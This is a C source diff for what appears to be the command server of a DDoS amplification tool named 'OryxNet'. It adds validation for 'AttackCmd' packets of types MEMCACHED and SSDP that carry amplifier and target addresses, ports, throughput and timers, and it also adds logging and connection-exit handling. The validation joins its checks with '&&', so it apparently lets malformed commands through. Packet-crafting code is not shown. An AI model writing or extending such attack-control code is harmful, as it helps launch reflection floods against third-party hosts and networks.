@@ -14,7 +14,35 @@ struct sockaddr_in serverAddr;
 
 static bool validateCmd( CommandPkt p_cmd )
 {
-    //TODO:This function
+    switch( (int)p_cmd.type )
+    {
+        case AttackCmd:
+            switch( (int) p_cmd.data.type )
+            {
+                case TEST:
+                case MEMCACHED:
+                case SSDP:
+
+                    if( !is_valid_ipv4( p_cmd.data.amp_ip) &&
+                        !is_valid_ipv4( p_cmd.data.target_ip))
+                    {
+                        return false; 
+                    }
+
+                    if( p_cmd.data.target_port < 0 &&
+                        p_cmd.data.amp_port    < 0 &&
+                        p_cmd.data.incrementThroughput < 0 &&
+                        p_cmd.data.timeFrequency < 0 &&
+                        p_cmd.data.timer < 0)
+                    {
+                        return false;
+                    }
+                    break;
+                default:
+                    return false;
+            }
+    }
+
     return true;    
 }
 
@@ -24,7 +52,6 @@ static CommandPkt * packetToCmd( char * p_pkt )
 
     if( NULL == p_pkt )
     {
-        //TODO:send error to client
         return NULL;
     }
     
@@ -32,7 +59,7 @@ static CommandPkt * packetToCmd( char * p_pkt )
     
     if( !validateCmd( *cmd ) )
     {
-        //TODO:send error to client
+        LOG("Invalid Command\n");
         return NULL;
     }
 
@@ -75,12 +102,13 @@ static ClientAddr * waitForClient()
     }
     clnLen = sizeof(struct sockaddr_in);
 
-    /* Wait for a client to connect */
+    LOG("Wait for a client to connect");
     if ((clnSock = accept(serverSock, (struct sockaddr *) &clnAddr, &clnLen)) < 0)
     {
         Efatal(ERROR_NET, "accept() failed");
     }
-    printf("Handling client %s\n", inet_ntoa(clnAddr.sin_addr));
+    //printf("Handling client %s\n", inet_ntoa(clnAddr.sin_addr));
+    LOG("Handling client\n");
     
     memalloc( &cln, sizeof(ClientAddr) );
     cln->socket = clnSock;
@@ -115,15 +143,17 @@ static CommandPkt * getCommand( ClientAddr p_addr )
     char buffer[RCVBUFSIZE];        /* Buffer for echo string */
     int recvMsgSize;                    /* Size of received message */
     CommandPkt *cmd  = NULL; 
-    int flags = 0;
-    
+    int flags = 0; 
+
     while( NULL == cmd )
     {
         /* Receive message from client */
-        if ((recvMsgSize = recv(p_addr.socket, buffer, RCVBUFSIZE, flags)) < 0)
+        if ((recvMsgSize = recv(p_addr.socket, buffer, RCVBUFSIZE, flags)) == 0)
         {
-            //send error to client
-            continue;
+            memalloc( &cmd, sizeof(CommandPkt) );
+            cmd->type = ExitCmd;
+            LOG("CONNEND\n");
+            return cmd;
         }
 
         if ((cmd = packetToCmd(buffer)) == NULL)
@@ -140,7 +170,7 @@ static void * commandHandler( void * p_addr )
     ClientAddr * addr = (ClientAddr *)p_addr;
     CommandPkt * cmd = NULL;
     LhfDraft *draft;
-    
+
     for(;;)/* Run forever */
     {
         cmd = getCommand(*addr);
@@ -157,6 +187,10 @@ static void * commandHandler( void * p_addr )
                     }
                     memfree( &draft );
                     break;
+                case ExitCmd:
+                    LOG("ExitCmd recived\n");
+                    return NULL;
+                    break;
                 default:
                     break;
             }
@@ -169,15 +203,11 @@ static void * commandHandler( void * p_addr )
 void OryxNet()
 {
     ClientAddr *    clnAddr;  
-    pthread_t threadID;
 
     for (;;) /* Run forever */
     {
         clnAddr = waitForClient();
-        if( 0 != pthread_create(&threadID, NULL, commandHandler, clnAddr) )
-        {
-            //TODO:send error
-        }
+        commandHandler(clnAddr);
     }
 }
 
